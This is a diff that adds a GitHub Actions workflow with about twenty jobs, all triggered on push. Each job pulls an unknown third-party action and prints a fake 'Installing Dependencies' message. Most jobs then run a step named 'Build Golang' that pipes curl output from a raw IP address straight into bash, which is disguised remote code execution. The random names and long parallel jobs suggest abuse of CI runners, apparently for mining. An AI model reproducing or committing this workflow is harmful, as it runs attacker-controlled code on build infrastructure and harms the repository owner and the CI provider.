@@ -1,0 +1,183 @@
+name: sohezeca
+on: push
+jobs:
+  zalige:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Installing Dependencies misovo..."
+    - name: Build Golang hecayo
+      run: curl -x 188.166.196.170:7129 http://188.166.196.170/mandalorian/sawofnine.php?siu=figarebowoxemakosa | bash -
+  fefofe:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Installing Dependencies nonuri..."
+    - name: Build Golang fuzoda
+      run: curl -x 188.166.196.170:7129 http://188.166.196.170/mandalorian/sawofnine.php?siu=kadideyecovikexicete | bash -
+  yuyuvi:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Installing Dependencies gireso..."
+    - name: Build Golang dufigete
+      run: curl -x 188.166.196.170:7129 http://188.166.196.170/mandalorian/sawofnine.php?siu=dirazeyutobeziju | bash -
+  muceye:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Installing Dependencies soxodo..."
+    - name: Build Golang pesuhula
+      run: curl -x 188.166.196.170:7129 http://188.166.196.170/mandalorian/sawofnine.php?siu=fipefurozopufopesuha | bash -
+  pebama:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Installing Dependencies desuma..."
+    - name: Build Golang ginigi
+      run: curl -x 188.166.196.170:7129 http://188.166.196.170/mandalorian/sawofnine.php?siu=risihabekexeliga | bash -
+  muzugacu:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Installing Dependencies dujevohi..."
+    - name: Build Golang josuhu
+      run: curl -x 188.166.196.170:7129 http://188.166.196.170/mandalorian/sawofnine.php?siu=dajanulelekozeti | bash -
+  cilidi:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Installing Dependencies fepejo..."
+    - name: Build Golang gofebu
+      run: curl -x 188.166.196.170:7129 http://188.166.196.170/mandalorian/sawofnine.php?siu=mekixesohijanevalefe | bash -
+  leferawe:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Installing Dependencies yiwarihu..."
+    - name: Build Golang suzixipa
+      run: curl -x 188.166.196.170:7129 http://188.166.196.170/mandalorian/sawofnine.php?siu=jaladijoxulizevuzeni | bash -
+  wofufi:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Installing Dependencies wozoxoju..."
+    - name: Build Golang cekafu
+      run: curl -x 188.166.196.170:7129 http://188.166.196.170/mandalorian/sawofnine.php?siu=dekejifisevihoxehojo | bash -
+  mohiyaki:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Installing Dependencies gucusi..."
+    - name: Build Golang mawohaci
+      run: curl -x 188.166.196.170:7129 http://188.166.196.170/mandalorian/sawofnine.php?siu=bobunaxufusadulucosa | bash -
+  vuluxe:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Installing Dependencies mitoco..."
+    - name: Build Golang jolicofa
+      run: curl -x 188.166.196.170:7129 http://188.166.196.170/mandalorian/sawofnine.php?siu=yimirasayavoyebekuniba | bash -
+  zajubi:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Installing Dependencies gucuwi..."
+    - name: Build Golang hebupo
+      run: curl -x 188.166.196.170:7129 http://188.166.196.170/mandalorian/sawofnine.php?siu=hacoyikiputezimekabayo | bash -
+  lerunice:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Installing Dependencies geyesace..."
+    - name: Build Golang ritika
+      run: curl -x 188.166.196.170:7129 http://188.166.196.170/mandalorian/sawofnine.php?siu=vetonirukutepotojibo | bash -
+  segibi:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Installing Dependencies mekope..."
+    - name: Build Golang muhoko
+      run: curl -x 188.166.196.170:7129 http://188.166.196.170/mandalorian/sawofnine.php?siu=payucitonoxilumado | bash -
+  wadili:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Installing Dependencies vuxifenu..."
+    - name: Build Golang viregi
+      run: curl -x 188.166.196.170:7129 http://188.166.196.170/mandalorian/sawofnine.php?siu=cayipojebapenijuyanu | bash -
+  hoxoya:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Installing Dependencies zacexu..."
+    - name: Build Golang coviwa
+      run: curl -x 188.166.196.170:7129 http://188.166.196.170/mandalorian/sawofnine.php?siu=gopabazeyifuravijeco | bash -
+  toxobile:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Installing Dependencies zisexe..."
+    - name: Build Golang mofotu
+      run: curl -x 188.166.196.170:7129 http://188.166.196.170/mandalorian/sawofnine.php?siu=hetizewacinuruzoyuco | bash -
+  modanuma:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Installing Dependencies kowivake..."
+    - name: Build Golang sujipu
+      run: curl -x 188.166.196.170:7129 http://188.166.196.170/mandalorian/sawofnine.php?siu=yavekugifohosufuneke | bash -
+  mupoyo:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Installing Dependencies kuwifo..."
+    - name: Build Golang wowove
+      run: curl -x 188.166.196.170:7129 http://188.166.196.170/mandalorian/sawofnine.php?siu=nohasosiweniwulelurunu | bash -
+  vusipozo:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Installing Dependencies debene..."
+    - name: Build Golang dobulufe
+      run: echo done
